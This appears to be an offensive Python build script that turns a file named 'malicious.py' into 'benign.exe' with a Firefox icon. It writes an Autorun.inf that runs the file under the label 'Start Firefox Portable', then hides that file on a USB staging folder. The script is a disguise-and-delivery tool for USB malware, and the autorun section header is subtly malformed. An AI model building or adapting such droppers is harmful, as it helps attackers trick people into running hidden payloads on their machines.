import os
import shutil

import PyInstaller.__main__

filename = "malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd, "USB")

if os.path.isdir(usbdir):
    shutil.rmtree(usbdir)

os.makedirs(usbdir, exist_ok=True)

if os.path.isfile(exename):
    os.remove(exename)

# Create executable from Python script
PyInstaller.__main__.run(
    [
        "malicious.py",
        "--onefile",
        "--clean",
        "--log-level=ERROR",
        "--name=" + exename,
        "--icon=" + icon,
    ]
)

# Clean up after Pyinstaller
shutil.move(os.path.join(pwd, "dist", exename), pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__", ignore_errors=True)
os.remove(exename + ".spec")

# Create Autorun File
with open("Autorun.inf", "w") as o:
    o.write("(Autorun)\n")
    o.write("Open=" + exename + "\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon=" + exename + "\n")

# Move files to USB and set to hidden
shutil.move(exename, usbdir)
shutil.move("Autorun.inf", usbdir)
os.system(f"attrib +h \"{os.path.join(usbdir,'Autorun.inf')}\"")
